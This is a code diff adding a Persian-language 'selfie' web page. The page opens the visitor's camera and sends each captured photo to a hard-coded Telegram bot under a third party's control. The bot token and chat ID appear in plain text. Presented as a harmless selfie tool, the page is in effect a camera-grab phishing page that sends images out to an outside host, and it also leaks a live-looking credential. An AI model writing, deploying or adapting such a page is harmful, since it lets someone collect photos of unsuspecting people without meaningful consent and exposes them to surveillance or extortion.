@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گرفتن سلفی</title>
+</head>
+<body>
+    <h1>گرفتن سلفی</h1>
+    <video id="video" autoplay></video> <!-- پخش ویدیو از دوربین -->
+    <button id="snap">گرفتن عکس</button> <!-- دکمه برای گرفتن عکس -->
+    <canvas id="canvas" style="display:none;"></canvas> <!-- محل ذخیره تصویر -->
+    <script>
+        // این بخش برای دسترسی به دوربین گوشی است
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snap = document.getElementById('snap');
+
+        // دسترسی به دوربین و نمایش تصویر در ویدیو
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+        });
+
+        // گرفتن عکس پس از کلیک روی دکمه
+        snap.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/png');
+            // ارسال تصویر به تلگرام
+            uploadToTelegram(imageData);
+        });
+
+        // این بخش برای ارسال عکس به ربات تلگرام است
+        function uploadToTelegram(imageData) {
+            fetch('https://api.telegram.org/bot8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY/sendPhoto', {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: '5871430093',
+                    photo: imageData
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    alert('عکس با موفقیت ارسال شد!');
+                } else {
+                    alert('خطا در ارسال عکس.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
